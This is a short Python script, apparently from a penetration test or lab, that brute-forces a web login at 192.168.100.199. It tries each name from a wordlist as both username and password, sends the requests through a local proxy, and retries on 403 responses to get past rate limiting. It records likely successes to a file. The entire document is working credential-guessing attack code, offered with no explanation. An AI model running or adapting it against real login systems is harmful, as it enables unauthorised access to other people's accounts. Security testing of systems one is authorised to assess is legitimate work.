#!/usr/bin/python
import requests
import time

proxies = {
    "http": "http://127.0.0.1:1080"
}

url = "http://192.168.100.199/auth"

headers = {
    "Content-Type": "application/json",
    "X-Requested-With": "XMLHttpRequest",

}

with open("userlist3.txt") as f:
    passwords = f.read().splitlines()

i = 0
status= 0

while True:
    status= 0
    s = requests.Session()
    r = s.get("http://192.168.100.199/login", proxies=proxies)
    if r.status_code != 200:
        print("GET FAILED!")
        exit(1)
    data = '{"action":"auth","data":{"username":"%s","password":"%s"}}' % (passwords[i], passwords[i])
    print("Testing username: %s" % passwords[i])
    while True:
        r = s.post(url, headers=headers, data=data, proxies=proxies)
        if r.status_code == 200:
            break
        if r.status_code == 403:
            status= status+ 1
            if status== 5:
                print("Skipping... %s" % passwords[i])
                break
    if (not "Cannot authenticate with data" in r.text) and (status< 5):
        print("Potential password! %s" % passwords[i])
        with open("out.txt", "a") as f:
            f.write("%s\n" % passwords[i])
    i = i + 1
    time.sleep(0.05)